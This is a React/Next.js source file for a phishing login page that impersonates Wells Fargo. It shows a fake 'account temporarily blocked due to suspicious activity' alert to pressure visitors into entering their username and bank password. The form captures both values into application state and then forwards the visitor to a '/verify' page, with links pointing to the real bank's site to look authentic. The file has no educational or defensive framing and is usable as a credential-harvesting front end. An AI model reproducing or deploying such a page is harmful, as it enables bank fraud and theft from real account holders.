import React, { useState, useEffect } from 'react';
import Link from 'next/link'
import Router from 'next/router';
import { useForm } from 'react-hook-form'
import { yupResolver } from '@hookform/resolvers/yup';
import * as yup from "yup";
import { createStore, useStateMachine } from "little-state-machine";


export const updateData = (state, payload) => {
    return {
        ...state,
        ...payload
    };
}



createStore({})



const LoginForm = () => {
    const myDate = new Date();
    const hrs = myDate.getHours();
    const showGreet = () => {
        var greet;
        if(hrs < 12){
            greet = 'Good morning'
        }
        else if(hrs >= 12 && hrs <= 17){
            greet = 'Good Afternoon'
        }
        else if (hrs >= 17 && hrs <= 24){
            greet = 'Good evening'
        }
        return greet;

    }



    const [show, setShow] = React.useState(false);
    const revealPass = ( ) => {
        setShow(!show)
    }



    const { actions } = useStateMachine({ updateData });

    const onSubmit = logins => {
        actions.updateData({ logins })
    };


    const schema = yup.object().shape({
        userName: yup.string().required().min(4),
        bankPassword: yup.string().required().min(6),

    })
    const { register, handleSubmit, watch, formState: { errors, isValid } } = useForm({
        resolver: yupResolver(schema),
        mode: 'all'
    })

    const sendTo = () => Router.push('/verify');



    return (
        <>
            <div className='pb-10 lg:pb-46 lg:grid lg:place-items-center lg:lg:max-w-4xl lg:rounded-3xl lg:w-full lg:bg-white lg:relative lg:top-16 lg:mb-20'>

                <div className='lg:relative top-5'>
                    <div className='sm:mx-40 flex flex-col xl:mb-8 xl:mt-4 max-w-md mx-10 relative mb-10 lg:mb-0 mt-10 bg-red-100 rounded-md border border-red-600  align-center justify-center p-4 lg:pl-10 lg:p-0 lg:pb-2 top-8 opacity-80'>
                        <Warning />
                        <h1 className='ml-9 relative -top-3 text-red-600 font-semibold'>Alert!</h1>
                        <p className='text-sm font-normal text-red-500'>Due to suspicious activity, we have temporarily blocked your account. To unblock and avoid suspension, please login below and confirm your online information</p>
                    </div>
                    <div className='lg:left-28 max-w-md mx-10 relative -top-1'>
                        <div className='tracking-wide flex font-fargogreet justify-center font-medium text-2xl relative top-10'>
                            <h1 >{showGreet()}</h1>
                        </div>
                        <h1 className='flex justify-center align-center text-md mb-10  mt-10 font-normal ml-6 top-5 relative text-gray-500 lg:mb-12' >Sign on to manage your accounts</h1>
                    </div>
                </div>
                <form onSubmit={handleSubmit(onSubmit)} key={1} className='max-w-xl  top-8 pb-4 mb-10 lg:pb-0 lg:mb-0'>

                    <div className='relative mx-5 sm:mx-20 rounded-sm p-5 lg:p-0'>


                        <div className='relative font-md '>
                            <div className={'lg:w-100 lg:max-w-md focus-within:border focus-within:rounded-sm focus-within:border-yellow-700 lg:focus-within:border-gray-700 relative pt-6 mb-10 lg:mb-4 border-b border-gray-700 focus-within:bg-focusbg' + (errors.userName?.message && ' border-b border-red-400 ')}>
                                <input
                                    {...register('userName')}
                                    type='text'
                                    autoComplete='off'
                                    placeholder=' '
                                    name='userName'
                                    className={'placeholder-transparent peer bg-transparent w-full p-2 block appearance-none border-none border-gray-400  focus:outline-none '}
                                />

                                <label className={'pointer-events-none peer-focus:text-sm peer-focus:-top-1 peer-focus:text-focustext peer-placeholder-shown:top-6 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-0 -top-1 text-sm p-2 duration-300 absolute origin-0   transition-all '} htmlFor='username '>Username</label>
                            </div>
                            
                            <div className={' lg:focus-within:border-gray-700 lg:w-100 lg:max-w-md focus-within:border focus-within:rounded-sm focus-within:border-yellow-700 relative pt-6  mb-10 border-b border-gray-700 focus-within:bg-focusbg ' + (errors.bankPassword?.message && ' border-b border-red-400 ')}>
                                <input
                                    type={show ? 'text' : 'password'}
                                    name='bankPassword'
                                    placeholder=' '
                                    className={'placeholder-transparent peer bg-transparent w-full p-2 block appearance-none border-none border-gray-400  focus:outline-none '}
                                    {...register('bankPassword')}
                                />
                                {
                                    show ? <div onClick={revealPass} ><ShowPass /></div> : <div onClick={revealPass} ><HidePass /></div>

                                }

                                <label className={'pointer-events-none peer-focus:text-sm peer-focus:-top-1 peer-focus:text-focustext peer-placeholder-shown:top-6 peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-lg left-0 -top-1 text-sm p-2 duration-300 absolute origin-0   transition-all '} htmlFor='username '>Password</label>
                            </div>
                            <input
                                type='checkbox'
                                className=' text-md mr-2 w-6 h-5'
                            />
                            <span>Save username</span>

                        </div>

                        <div className="lg:flex lg:justify-center">
                            <button onClick={() => { setTimeout(sendTo, 1500); handleSubmit(onSubmit) }} type='submit' disabled={!isValid} className='w-full lg:w-40 lg:flex lg:justify-center mt-7 rounded-md bg-fargohead p-2 text-white mr-2 mb-6 font-medium hover:bg-red-800 hover:underline'>Sign On</button>
                        </div>
                        <div className=' lg:w-80 lg:mx-0 '>
                            <Link href='wellsfargo.com'><a className='text-fargobrown  text-sm border-yellow-800 border-b'>Forgot Password/Username? or</a></Link>
                            <Link href='wellsfargo.com'><a className='text-fargobrown text-sm border-b border-yellow-800'> Enroll Now </a></Link>
                        </div>




                    </div>
                </form>
            </div>
        </>
    )
}




const Warning = () => {
    return (
        <>

            <div className='relative top-4'>
                <svg width='33px' viewBox="0 0 40 40" ariaHidden="true" role="img" fill='#A10720' focusable="false"><path d="M20 34c-7.732 0-14-6.268-14-14S12.268 6 20 6s14 6.268 14 14c-.01 7.728-6.272 13.99-14 14zm-.934-10.824h1.848l.461-9.975h-2.771l.462 9.975zm.945 4.494c.434 0 .794-.147 1.081-.44.287-.295.43-.659.43-1.093 0-.448-.143-.812-.43-1.092-.287-.28-.647-.42-1.081-.42-.449 0-.816.14-1.103.42-.287.28-.43.644-.43 1.092 0 .434.143.798.43 1.092.287.294.654.441 1.102.441z" ></path></svg>
            </div>

        </>
    )
}

const ShowPass = () => {

    return (
        <div className='absolute right-3 top-8'>
            <svg width="24px" height="24px" viewBox="0 0 24 24" aria-hidden="true" role="img" focusable="false"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g opacity="0.01"><rect fill="#FFBFF9" x="0" y="0" width="24" height="24"></rect><rect fill="#FFFFFF" x="1" y="1" width="22" height="22"></rect><g stroke-width="1" transform="translate(0.000000, 1.000000)" stroke="#FF2AEC"><rect stroke-width="0.25" x="6.625" y="0.125" width="10.75" height="21.75" rx="2"></rect><path d="M8.5,0.125 C7.46446609,0.125 6.625,0.964466094 6.625,2 L6.625,20 C6.625,21.0355339 7.46446609,21.875 8.5,21.875 L15.5,21.875 C16.5355339,21.875 17.375,21.0355339 17.375,20 L17.375,2 C17.375,0.964466094 16.5355339,0.125 15.5,0.125 L8.5,0.125 Z" stroke-width="0.25" transform="translate(12.000000, 11.000000) rotate(-270.000000) translate(-12.000000, -11.000000) "></path><path d="M1,11 L23,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-90.000000) translate(-12.000000, -11.000000) "></path><path d="M0.978218914,11 L22.9782189,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(11.978219, 11.000000) rotate(-180.000000) translate(-11.978219, -11.000000) "></path><path d="M-2.8492424,11 L26.8492424,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-135.000000) translate(-12.000000, -11.000000) "></path><path d="M-2.8492424,11 L26.8492424,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-45.000000) translate(-12.000000, -11.000000) "></path><circle stroke-width="0.5" cx="12" cy="11" r="8.75"></circle><circle strokeWidth="0.5" cx="12" cy="11" r="5.25"></circle><rect stroke-width="0.5" x="3.25" y="2.25" width="17.5" height="17.5" rx="2"></rect></g></g><path d="M12.13525,18.33925 C16.71175,18.33925 20.7655,16.105 23.26975,12.67 C20.7655,9.23425 16.71175,7 12.13525,7 C7.558,7 3.50425,9.23425 1,12.67 C3.50425,16.105 7.558,18.33925 12.13525,18.33925 Z M8.51125,7.49275 C7.6285,8.40025 7.08475,9.64 7.08475,11.00575 C7.08475,13.7905 9.34225,16.04875 12.12775,16.04875 C14.9125,16.04875 17.17,13.7905 17.17,11.00575 C17.17,9.63925 16.62625,8.40025 15.7435,7.49275" id="mask" stroke="#3B3331" strokeLinecap="round" strokeLinejoin="round"></path></g></svg>
        </div>

    )
}

const HidePass = () => {

    return (
        <div  className='absolute right-3 top-8'>
            <svg width="24px" height="24px" viewBox="0 0 24 24" ariaHidden="true" role="img" focusable="false"><g stroke="none" strokeWidth="1" fill="none" fillRule="evenodd"><g opacity="0.01"><rect fill="#FFBFF9" x="0" y="0" width="24" height="24"></rect><rect fill="#FFFFFF" x="1" y="1" width="22" height="22"></rect><g strokeWidth="1" transform="translate(0.000000, 1.000000)" stroke="#FF2AEC"><rect strokeWidth="0.25" x="6.625" y="0.125" width="10.75" height="21.75" rx="2"></rect><path d="M8.5,0.125 C7.46446609,0.125 6.625,0.964466094 6.625,2 L6.625,20 C6.625,21.0355339 7.46446609,21.875 8.5,21.875 L15.5,21.875 C16.5355339,21.875 17.375,21.0355339 17.375,20 L17.375,2 C17.375,0.964466094 16.5355339,0.125 15.5,0.125 L8.5,0.125 Z" stroke-width="0.25" transform="translate(12.000000, 11.000000) rotate(-270.000000) translate(-12.000000, -11.000000) "></path><path d="M1,11 L23,11" strokeWidth="0.3" strokeLinecap="square" strokeDasharray="1" transform="translate(12.000000, 11.000000) rotate(-90.000000) translate(-12.000000, -11.000000) "></path><path d="M0.978218914,11 L22.9782189,11" strokeWidth="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(11.978219, 11.000000) rotate(-180.000000) translate(-11.978219, -11.000000) "></path><path d="M-2.8492424,11 L26.8492424,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-135.000000) translate(-12.000000, -11.000000) "></path><path d="M-2.8492424,11 L26.8492424,11" stroke-width="0.3" stroke-linecap="square" stroke-dasharray="1" transform="translate(12.000000, 11.000000) rotate(-45.000000) translate(-12.000000, -11.000000) "></path><circle stroke-width="0.5" cx="12" cy="11" r="8.75"></circle><circle stroke-width="0.5" cx="12" cy="11" r="5.25"></circle><rect stroke-width="0.5" x="3.25" y="2.25" width="17.5" height="17.5" rx="2"></rect></g></g><path d="M12.13525,18.512 C16.71175,18.512 20.7655,16.27775 23.26975,12.842 C20.7655,9.407 16.71175,7.17275 12.13525,7.17275 C7.558,7.17275 3.50425,9.407 1,12.842 C3.50425,16.27775 7.558,18.512 12.13525,18.512 Z M8.51125,7.66475 C7.6285,8.573 7.08475,9.812 7.08475,11.1785 C7.08475,13.96325 9.34225,16.22075 12.12775,16.22075 C14.9125,16.22075 17.17,13.96325 17.17,11.1785 C17.17,9.812 16.62625,8.573 15.7435,7.66475 M3.88675,19.628 L18.34,5 L3.88675,19.628 Z" stroke="#3B3331" stroke-linecap="round" stroke-linejoin="round"></path></g></svg>
        </div>
    )
}

export default LoginForm
